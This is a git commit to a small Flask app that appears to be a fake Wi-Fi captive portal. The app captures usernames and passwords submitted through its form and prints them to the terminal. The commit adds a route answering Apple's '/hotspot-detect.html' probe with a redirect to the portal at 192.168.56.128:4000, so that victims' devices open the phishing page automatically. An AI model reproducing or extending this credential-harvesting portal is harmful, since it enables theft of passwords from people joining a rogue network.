0efb8dd69b831f9ce4178459ca80b72d40ab05ea
root <root@kali.kali>
2024-11-16 01:44:33 -0500

    redirect page

--- cp/main.py
+++ cp/main.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
@@ -13,6 +13,11 @@ def send_text():
     password = request.form['password_input']
     print(f"User {user} \nPassword {password}")  # Affiche le texte dans le terminal
     return render_template('index.html')  # Affiche le texte
+
+@app.route('/hotspot-detect.html')
+def hotspot_detect():
+    # Répond à la requête /hotspot-detect.html pour confirmer que le portail captive est actif
+    return redirect("http://192.168.56.128:4000", code=302)
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0",port="4000",debug=True)  # Lancer le serveur Flask
